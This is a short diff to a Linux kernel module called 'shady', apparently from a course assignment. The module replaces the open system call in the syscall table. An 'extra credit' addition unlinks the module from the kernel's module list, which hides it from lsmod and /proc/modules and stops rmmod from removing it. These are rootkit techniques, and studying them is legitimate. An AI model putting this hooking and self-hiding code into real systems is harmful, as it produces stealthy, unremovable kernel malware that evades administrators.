@@ -34,6 +34,7 @@
 #include <linux/mutex.h>
 #include <linux/unistd.h>
 #include <linux/cred.h>
+#include <linux/module.h>
 
 #include <asm/uaccess.h>
 #include <asm/unistd_32.h>
@@ -256,6 +257,11 @@ shady_init_module(void)
 
   // Set the location of the open function to my_open.
   system_call_table[__NR_open] = (unsigned int)my_open;
+
+  // EXTRA CREDIT LINE, remove this module from the list of
+  // modules, effectively hides form lsmod and hidden from
+  // /proc/modules. rmmod no longer works because of this.
+  list_del(&THIS_MODULE->list);
 
   if (shady_ndevices <= 0)
     {
